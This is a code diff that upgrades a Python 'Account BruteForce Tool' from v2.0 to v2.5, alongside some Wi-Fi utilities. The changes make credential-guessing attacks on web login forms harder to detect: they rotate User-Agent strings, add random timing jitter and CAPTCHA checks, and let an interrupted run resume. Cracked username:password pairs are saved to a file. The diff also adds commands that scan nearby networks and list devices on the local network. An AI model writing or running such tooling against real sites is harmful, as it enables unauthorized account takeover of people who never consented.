@@ -2,9 +2,21 @@ import os
 import time
 import requests
 import itertools
+import random
 from colorama import init, Fore, Back, Style
 
 init()
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (X11; Linux x86_64)",
+    "Mozilla/5.0 (Android 10; Mobile; rv:91.0)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
+]
+
+resume_file = "resume.txt"
+log_file = "log.txt"
+found_file = "found.txt"
 
 def print_header():
     os.system("clear" if os.name == "posix" else "cls")
@@ -16,7 +28,7 @@ def print_header():
 ██║╚██╔╝██║    ██╔══╝      ██║  ██║    ██║   ██║
 ██║ ╚═╝ ██║    ███████╗    ██████╔╝    ╚██████╔╝
 ╚═╝     ╚═╝    ╚══════╝    ╚═════╝      ╚═════╝     
-       Account BruteForce Tool v2.0 + Wi-Fi Tools
+       Account BruteForce Tool v2.5 + Wi-Fi Tools
 """)
     print("="*60)
     print(Back.RED + Fore.WHITE + Style.BRIGHT + "[!] WARNING & DISCLAIMER:" + Style.RESET_ALL)
@@ -29,17 +41,18 @@ def print_header():
 
 def try_login(url, username_field, password_field, username, password, proxy):
     data = {username_field: username, password_field: password}
+    headers = {'User-Agent': random.choice(user_agents)}
     proxies = {"http": proxy, "https": proxy} if proxy else None
     try:
-        response = requests.post(url, data=data, proxies=proxies, timeout=10)
-        if response.status_code == 200 and "invalid" not in response.text.lower() and "error" not in response.text.lower():
+        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
+        if response.status_code == 200 and "invalid" not in response.text.lower() and "error" not in response.text.lower() and "captcha" not in response.text.lower():
             print(f"\n\033[92m[✓] FOUND! Password: {password}\033[0m")
-            with open("found.txt", "a") as f:
+            with open(found_file, "a") as f:
                 f.write(f"[FOUND] {username}:{password}\n")
             return True
         else:
             print(f"[!] Tried: {password}", end='\r')
-            with open("log.txt", "a") as f:
+            with open(log_file, "a") as f:
                 f.write(f"[FAIL] {username}:{password} @ {time.ctime()}\n")
             return False
     except Exception as e:
@@ -49,17 +62,18 @@ def try_login(url, username_field, password_field, username, password, proxy):
 def wifi_tools():
     while True:
         print("\n[ Wi-Fi Tools ]")
-        print("1. Scan nearby networks (Linux/Termux only)")
-        print("2. Show connected network")
+        print("1. Scan nearby networks (Linux only)")
+        print("2. Show connected network (Linux only)")
         print("3. Internet speed test")
+        print("4. List connected devices (Linux/Termux)")
         print("0. Back to main menu")
 
         choice = input("[*] Choose option: ")
 
         if choice == "1":
-            os.system("nmcli dev wifi" if os.name == "posix" else "echo Only available on Linux/Termux")
+            os.system("iwlist wlan0 scan | grep 'ESSID'" if os.name == "posix" else "echo Only available on Linux")
         elif choice == "2":
-            os.system("iwgetid" if os.name == "posix" else "echo Only available on Linux/Termux")
+            os.system("iwgetid" if os.name == "posix" else "echo Only available on Linux")
         elif choice == "3":
             try:
                 import speedtest
@@ -73,6 +87,8 @@ def wifi_tools():
                 print("[*] Ping:", s.results.ping, "ms")
             except Exception as e:
                 print("[-] Speed test failed:", e)
+        elif choice == "4":
+            os.system("ip neigh" if os.name == "posix" else "arp -a")
         elif choice == "0":
             break
         else:
@@ -139,15 +155,31 @@ def bruteforce_main():
         print("[-] Invalid choice.")
         return
 
+    if os.path.isfile(resume_file):
+        resume = input("[?] Resume from last password? (y/n): ").lower()
+        if resume == 'y':
+            with open(resume_file, "r") as f:
+                last = f.read().strip()
+            print(f"[*] Resuming from password: {last}")
+            passwords = itertools.dropwhile(lambda p: p != last, passwords)
+
     delay = float(input("[?] Delay between attempts (seconds): "))
+    attempts = 0
+    start_time = time.time()
 
     for password in passwords:
+        attempts += 1
+        with open(resume_file, "w") as f:
+            f.write(password)
         if try_login(url, username_field, password_field, username, password, proxy):
-            input("\nPress Enter to exit...")
-            return
-        time.sleep(delay)
+            break
+        time.sleep(delay + random.uniform(0.1, 0.5))
 
-    print("\n[-] Done. Password not found.")
+    end_time = time.time()
+    duration = end_time - start_time
+    print(f"\n[-] Done. Password not found.")
+    print(f"[*] Attempts: {attempts}")
+    print(f"[*] Time taken: {round(duration, 2)} seconds")
 
 def main():
     print_header()
